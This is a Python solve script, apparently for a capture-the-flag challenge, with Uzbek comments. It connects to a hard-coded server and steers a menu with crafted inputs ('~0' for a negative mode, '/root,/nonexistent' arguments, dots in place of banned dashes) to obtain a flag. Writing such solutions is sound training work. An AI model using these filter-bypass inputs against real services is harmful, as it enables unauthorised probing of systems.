#!/usr/bin/env python3
import socket
import time

# IP va Portni yangilab oling
HOST = "154.57.164.68"
PORT = 31363

def recv_until(sock, marker, timeout=10):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data

def sendline(sock, s):
    if isinstance(s, str):
        s = s.encode()
    sock.sendall(s + b"\n")
    time.sleep(0.3) # Server qabul qilishiga ulgurishi uchun

def main():
    try:
        with socket.create_connection((HOST, PORT), timeout=10) as sock:
            # 1. Mode tanlash
            recv_until(sock, b"> ")
            sendline(sock, "1")
            recv_until(sock, b"(mode)> ")
            sendline(sock, "~0") # Natija: -1

            # 2. Bin tanlash (ls ishlatish tavsiya etiladi)
            recv_until(sock, b"> ")
            sendline(sock, "2")
            recv_until(sock, b"(bin)> ")
            sendline(sock, "ls")

            # 3. Argumentlar (rc=1 va rc=2 olish uchun)
            recv_until(sock, b"> ")
            sendline(sock, "3")
            recv_until(sock, b"(arg1,arg2)> ")
            # Birinchi argument: ruxsat yo'q yoki xato (rc=1)
            # Ikkinchi argument: mavjud bo'lmagan yo'l (rc=2)
            sendline(sock, "/root,/nonexistent")

            # 4. Switchlar (minus taqiqlangan bo'lsa nuqta ishlating)
            recv_until(sock, b"> ")
            sendline(sock, "4")
            recv_until(sock, b"(switch1,switch2)> ")
            sendline(sock, ".,.")

            # 5. Beat the competitor!
            recv_until(sock, b"> ")
            sendline(sock, "5")

            # Flagni o'qish
            print("[+] Flag kutilmoqda...")
            time.sleep(1)
            out = sock.recv(4096).decode(errors="ignore")
            print(out)

    except Exception as e:
        print(f"[!] Xatolik: {e}")

if __name__ == "__main__":
    main()
